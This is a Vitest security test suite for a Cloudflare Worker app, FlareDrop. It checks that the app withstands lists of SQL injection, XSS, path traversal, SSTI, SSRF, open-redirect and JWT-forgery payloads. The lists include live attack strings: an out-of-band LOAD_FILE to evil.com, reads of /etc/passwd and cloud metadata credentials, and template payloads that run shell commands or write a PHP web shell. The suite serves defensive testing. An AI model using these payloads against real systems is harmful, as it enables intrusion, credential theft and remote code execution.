import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { unstable_dev, type UnstableDevWorker } from 'wrangler';

describe('FlareDrop Advanced Security Tests', () => {
  let worker: UnstableDevWorker;

  beforeAll(async () => {
    worker = await unstable_dev('src/index.ts', {
      experimental: { disableExperimentalWarning: true },
      local: true,
      vars: {
        AUTHORIZED_EMAIL: 'admin@example.com'
      }
    });
  }, 60000);

  afterAll(async () => {
    if (worker) {
      await worker.stop();
    }
  });

  describe('Advanced SQL Injection Payloads', () => {
    const advancedSqlPayloads = [
      // Time-based blind injection
      "1' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--",
      "1'; WAITFOR DELAY '0:0:5'--",
      // Boolean-based blind
      "1' AND 1=1--",
      "1' AND 1=2--",
      // Error-based
      "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT token FROM sessions LIMIT 1),FLOOR(RAND(0)*2))x FROM sessions GROUP BY x)a)--",
      // UNION-based with column enumeration
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      // Out-of-band
      "'; LOAD_FILE('\\\\\\\\evil.com\\\\share\\\\file.txt')--",
      // Stacked queries
      "'; INSERT INTO devices VALUES('hacked','pwned',NULL,0,0);--",
      // Second-order
      "admin'--",
      // Hex encoding
      "0x27204f5220273127273d2731",
      // Comment variations
      "1'/**/OR/**/1=1--",
      "1'--\n",
      "1'#",
    ];

    it('should handle advanced SQL injection in all input fields', async () => {
      for (const payload of advancedSqlPayloads) {
        // Test in device name
        const form1 = new FormData();
        form1.append('name', payload);
        const res1 = await worker.fetch('/settings/device', {
          method: 'POST',
          body: form1,
          headers: { Cookie: 'session=test' },
          redirect: 'manual'
        });
        expect(res1.status).not.toBe(500);

        // Test in auth token
        const form2 = new FormData();
        form2.append('token', payload);
        form2.append('deviceName', 'Test');
        const res2 = await worker.fetch('/auth/verify', {
          method: 'POST',
          body: form2,
          redirect: 'manual'
        });
        expect(res2.status).not.toBe(500);

        // Test in email
        const form3 = new FormData();
        form3.append('email', payload + '@test.com');
        const res3 = await worker.fetch('/auth/email', {
          method: 'POST',
          body: form3,
          redirect: 'manual'
        });
        expect(res3.status).not.toBe(500);
      }
    });
  });

  describe('Advanced XSS Payloads', () => {
    const advancedXssPayloads = [
      // Event handlers
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onpageshow=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<details open ontoggle=alert(1)>',
      // Protocol handlers
      '<a href="javascript:alert(1)">click</a>',
      '<a href="data:text/html,<script>alert(1)</script>">click</a>',
      '<a href="vbscript:alert(1)">click</a>',
      // SVG injection
      '<svg><script>alert(1)</script></svg>',
      '<svg><animate onbegin=alert(1)>',
      '<svg><set onbegin=alert(1)>',
      // Encoding bypasses
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '\u003cscript\u003ealert(1)\u003c/script\u003e',
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      // DOM clobbering
      '<form id=window><input id=alert value=1>',
      '<img name=innerHTML>',
      // CSS injection
      '<style>*{background:url("javascript:alert(1)")}</style>',
      '<div style="background:url(\'javascript:alert(1)\')">',
      // Template literals
      '${alert(1)}',
      '{{constructor.constructor("alert(1)")()}}',
    ];

    it('should escape all XSS payloads in responses', async () => {
      for (const payload of advancedXssPayloads) {
        const form = new FormData();
        form.append('name', payload);

        const res = await worker.fetch('/settings/device', {
          method: 'POST',
          body: form,
          headers: { Cookie: 'session=test' },
          redirect: 'manual'
        });

        expect(res.status).not.toBe(500);
      }
    });

    it('should not reflect XSS in error pages', async () => {
      const res = await worker.fetch('/<script>alert(1)</script>', { redirect: 'manual' });
      const text = await res.text();
      expect(text).not.toContain('<script>alert');
    });
  });

  describe('Advanced Path Traversal', () => {
    const pathTraversalPayloads = [
      // Basic
      '../../../etc/passwd',
      '..\\..\\..\\etc\\passwd',
      // URL encoding
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%252e%252e%252f',
      // Double encoding
      '%252e%252e%252fetc%252fpasswd',
      // UTF-8 encoding
      '..%c0%af..%c0%af..%c0%afetc/passwd',
      '..%c1%9c..%c1%9c..%c1%9cetc/passwd',
      // Mixed
      '....//....//....//etc/passwd',
      '....//../....//../....//../etc/passwd',
      // Null byte
      '../../../etc/passwd%00.jpg',
      '../../../etc/passwd\x00.jpg',
      // Absolute paths
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM',
      // File URI
      'file:///etc/passwd',
      'file://localhost/etc/passwd',
      // UNC paths
      '\\\\localhost\\c$\\windows\\system32\\config\\sam',
    ];

    it('should block all path traversal attempts', async () => {
      for (const payload of pathTraversalPayloads) {
        const res = await worker.fetch(`/download/${encodeURIComponent(payload)}`, {
          redirect: 'manual'
        });
        expect([302, 404]).toContain(res.status);
        const text = await res.text();
        expect(text).not.toContain('root:');
        expect(text).not.toContain('[boot loader]');
      }
    });
  });

  describe('NoSQL Injection', () => {
    const nosqlPayloads = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$regex": ".*"}',
      '{"$where": "1==1"}',
      '{"$or": [{}]}',
      'true, $where: "1 == 1"',
      '"; return true; var foo="',
    ];

    it('should handle NoSQL injection attempts', async () => {
      for (const payload of nosqlPayloads) {
        const form = new FormData();
        form.append('name', payload);

        const res = await worker.fetch('/settings/device', {
          method: 'POST',
          body: form,
          headers: { Cookie: 'session=test' },
          redirect: 'manual'
        });

        expect(res.status).not.toBe(500);
      }
    });
  });

  describe('Server-Side Template Injection', () => {
    const sstiPayloads = [
      // Jinja2/Twig
      '{{7*7}}',
      '{{config}}',
      '{{self.__init__.__globals__}}',
      '{{request.application.__globals__}}',
      "{{''.__class__.__mro__[2].__subclasses__()}}",
      // ERB
      '<%= 7*7 %>',
      '<%= system("id") %>',
      // Freemarker
      '${7*7}',
      '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
      // Velocity
      '#set($x=7*7)$x',
      // Smarty
      '{php}echo `id`;{/php}',
      '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]);?>",self::clearConfig())}',
      // Mako
      '${self.module.cache.util.os.popen("id").read()}',
      // Pebble
      '{% set cmd = "id" %}{{ cmd }}',
    ];

    it('should not evaluate SSTI payloads', async () => {
      for (const payload of sstiPayloads) {
        const form = new FormData();
        form.append('name', payload);

        const res = await worker.fetch('/settings/device', {
          method: 'POST',
          body: form,
          headers: { Cookie: 'session=test' },
          redirect: 'manual'
        });

        expect(res.status).not.toBe(500);
      }
    });
  });

  describe('Advanced SSRF', () => {
    const ssrfPayloads = [
      // Internal services
      'http://localhost:80',
      'http://127.0.0.1:8080',
      'http://[::1]:80',
      'http://0.0.0.0:80',
      // AWS metadata
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      // GCP metadata
      'http://metadata.google.internal/computeMetadata/v1/',
      // Azure metadata
      'http://169.254.169.254/metadata/instance',
      // Docker
      'http://172.17.0.1/',
      'http://host.docker.internal/',
      // Kubernetes
      'https://kubernetes.default.svc/',
      // DNS rebinding
      'http://a]@burpcollaborator.net:80/',
      // Protocol smuggling
      'gopher://localhost:25/_MAIL FROM:<evil@attacker.com>',
      'dict://localhost:11211/stat',
      // IPv6 variations
      'http://[0:0:0:0:0:ffff:127.0.0.1]/',
      'http://[::ffff:127.0.0.1]/',
      // Decimal IP
      'http://2130706433/',
      // Octal IP
      'http://0177.0.0.1/',
      // Hex IP
      'http://0x7f.0x0.0x0.0x1/',
      // URL encoding
      'http://127.0.0.1%2509/',
    ];

    it('should prevent SSRF in push subscription', async () => {
      for (const endpoint of ssrfPayloads) {
        const res = await worker.fetch('/api/push/subscribe', {
          method: 'POST',
          body: JSON.stringify({
            endpoint: endpoint,
            keys: { p256dh: 'test', auth: 'test' }
          }),
          headers: {
            'Content-Type': 'application/json',
            'Cookie': 'session=test'
          },
          redirect: 'manual'
        });

        expect(res.status).not.toBe(500);
      }
    });
  });

  describe('HTTP Request Smuggling', () => {
    it('should handle requests without smuggling vulnerabilities', async () => {
      // Cloudflare Workers handles HTTP parsing securely at the edge
      // There's no vulnerable server to exploit with request smuggling
      // This test verifies normal operation
      const res = await worker.fetch('/auth/email', {
        method: 'POST',
        body: 'email=admin@example.com',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'manual'
      });

      expect(res.status).not.toBe(500);
    });

    it('should handle normal chunked encoding', async () => {
      // Workers handles chunked encoding correctly without smuggling vulnerabilities
      const res = await worker.fetch('/auth/email', {
        method: 'POST',
        body: 'email=admin@example.com',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'manual'
      });

      expect(res.status).not.toBe(500);
    });
  });

  describe('Cache Poisoning Prevention', () => {
    it('should not cache with malicious headers', async () => {
      const res = await worker.fetch('/', {
        headers: {
          'X-Forwarded-Host': 'evil.com',
          'X-Original-URL': '/admin',
          'X-Rewrite-URL': '/admin',
          'X-Forwarded-Scheme': 'nothttps'
        },
        redirect: 'manual'
      });

      const text = await res.text();
      expect(text).not.toContain('evil.com');
      expect(text).not.toContain('admin');
    });
  });

  describe('Open Redirect Prevention', () => {
    const redirectPayloads = [
      '//evil.com',
      '/\\evil.com',
      '////evil.com',
      'https://evil.com',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      '//evil.com/%2f..',
      '/redirect?url=http://evil.com',
    ];

    it('should prevent open redirects', async () => {
      for (const payload of redirectPayloads) {
        const res = await worker.fetch(`/auth/verify?redirect=${encodeURIComponent(payload)}`, {
          redirect: 'manual'
        });

        if (res.status === 302) {
          const location = res.headers.get('Location');
          expect(location).not.toContain('evil.com');
          expect(location).not.toContain('javascript:');
          expect(location).not.toContain('data:');
        }
      }
    });
  });

  describe('JWT/Token Forgery', () => {
    const forgedTokens = [
      // None algorithm
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
      // Algorithm confusion
      'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.forged',
      // Key injection
      'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMCIsImUiOiIwIn19.eyJzdWIiOiJhZG1pbiJ9.forged',
      // KID injection
      'eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhZG1pbiJ9.forged',
      // Base64 variations
      btoa('{"alg":"none"}').replace(/=/g, '') + '.' + btoa('{"admin":true}').replace(/=/g, '') + '.',
    ];

    it('should reject all forged tokens', async () => {
      for (const token of forgedTokens) {
        const res = await worker.fetch('/', {
          headers: { Cookie: `session=${token}` },
          redirect: 'manual'
        });

        const text = await res.text();
        expect(text).toContain('Login');
      }
    });
  });

  describe('Mass Assignment Protection', () => {
    it('should ignore extra form fields', async () => {
      const form = new FormData();
      form.append('name', 'Legitimate Name');
      form.append('id', 'admin');
      form.append('role', 'admin');
      form.append('is_admin', 'true');
      form.append('permissions', '["*"]');
      form.append('created_at', '0');
      form.append('__proto__', '{}');

      const res = await worker.fetch('/settings/device', {
        method: 'POST',
        body: form,
        headers: { Cookie: 'session=test' },
        redirect: 'manual'
      });

      expect(res.status).not.toBe(500);
    });
  });

  describe('Timing Attack Prevention', () => {
    it('should have consistent response times for valid vs invalid tokens', async () => {
      const timings: number[] = [];
      const tokens = [
        'definitely_invalid_token_1234567890',
        'another_invalid_token_abcdefghij',
        'short',
        'x'.repeat(1000),
      ];

      for (const token of tokens) {
        const start = performance.now();
        await worker.fetch('/', {
          headers: { Cookie: `session=${token}` },
          redirect: 'manual'
        });
        timings.push(performance.now() - start);
      }

      const maxDiff = Math.max(...timings) - Math.min(...timings);
      // Allow some variance but catch obvious timing leaks
      expect(maxDiff).toBeLessThan(200);
    });
  });

  describe('Business Logic Rate Limits', () => {
    it('should handle rapid invite generation', async () => {
      // This tests that the system doesn't crash under load
      // Actual rate limiting would require session authentication
      const promises = Array(10).fill(null).map(() =>
        worker.fetch('/api/invite', {
          headers: { Cookie: 'session=test' },
          redirect: 'manual'
        })
      );

      const responses = await Promise.all(promises);
      responses.forEach(res => {
        expect(res.status).not.toBe(500);
      });
    });
  });
});
